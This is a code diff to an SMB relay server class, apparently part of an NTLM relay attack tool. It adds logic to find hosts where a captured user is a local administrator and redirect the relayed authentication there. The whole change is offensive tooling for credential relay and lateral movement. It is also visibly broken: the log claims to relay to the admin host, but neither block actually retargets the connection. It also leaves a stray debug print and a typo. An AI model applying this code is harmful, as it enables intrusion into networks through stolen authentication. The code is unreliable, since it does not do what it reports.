@@ -97,7 +97,6 @@ class SMBRelayServer(Thread):
     ### SMBv2 Part #################################################################
     def SmbNegotiate(self, connId, smbServer, recvPacket, isSMB1=False):
         connData = smbServer.getConnectionData(connId, checkStatus=False)
-
         if self.config.mode.upper() == 'REFLECTION':
             self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
 
@@ -305,6 +304,13 @@ class SMBRelayServer(Thread):
                     respToken2 = SPNEGO_NegTokenResp()
                     respToken2['ResponseToken'] = str(securityBlob)
                     securityBlob = respToken2.getData()
+                
+                # if the authUser is in the localAdminMap, update the target to one of those hosts
+                print "checking admin"
+                adminTarget = self.targetprocessor.checkAdmin(self.authUser)
+                if adminTarget:
+                    logging.info("Local admin disovered! {} is a local admin on {}. Relaying there instead...".format(self.authUser, adminTarget))
+                    client = smbData[self.target]['SMBClient']
 
                 clientResponse, errorCode = self.do_ntlm_auth(client, securityBlob,
                                                               connData['CHALLENGE_MESSAGE']['challenge'])
@@ -495,6 +501,13 @@ class SMBRelayServer(Thread):
                     #For some attacks it is important to know the authenticated username, so we store it
                     self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                 authenticateMessage['user_name'].decode('utf-16le'))).upper()
+
+                    # if the authUser is in the localAdminMap, update the target to one of those hosts
+                    print "checking admin"
+                    adminTarget = self.targetprocessor.checkAdmin(self.authUser)
+                    if adminTarget:
+                        logging.info("Local admin disovered! {} is a local admin on {}. Relaying there instead...".format(self.authUser, adminTarget))
+                        #client = smbData[self.target]['SMBClient']
 
                     clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],
                                                                   connData['CHALLENGE_MESSAGE']['challenge'])
